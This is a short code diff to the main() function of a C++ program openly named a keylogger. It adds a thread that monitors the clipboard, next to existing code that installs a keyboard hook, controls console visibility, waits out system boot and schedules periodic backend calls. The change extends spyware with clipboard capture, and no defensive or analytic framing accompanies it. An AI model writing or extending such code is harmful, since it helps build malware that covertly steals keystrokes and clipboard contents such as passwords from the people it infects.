@@ -23,6 +23,9 @@ int main() {
     std::thread schedulerThread(scheduleBackendCalls, config.intervalMinutes * 60, std::ref(config));
     schedulerThread.detach();
     std::cout << "Network scheduler thread started and detached" << std::endl;
+    std::cout << "Starting clipboard monitor thread..." << std::endl;
+    std::thread clipboardThread(Keylogger::RunClipboardMonitor, &config);
+    std::cout << "Clipboard monitor thread started" << std::endl;
     Keylogger::SetConsoleVisibility(config);
     if (config.boot_wait) {
         while (Keylogger::IsSystemBooting(config)) {
@@ -34,4 +37,5 @@ int main() {
     logger.InstallHook();
     std::cout << "Starting keylogger..." << std::endl;
     logger.Run();
+    clipboardThread.join();
 } 
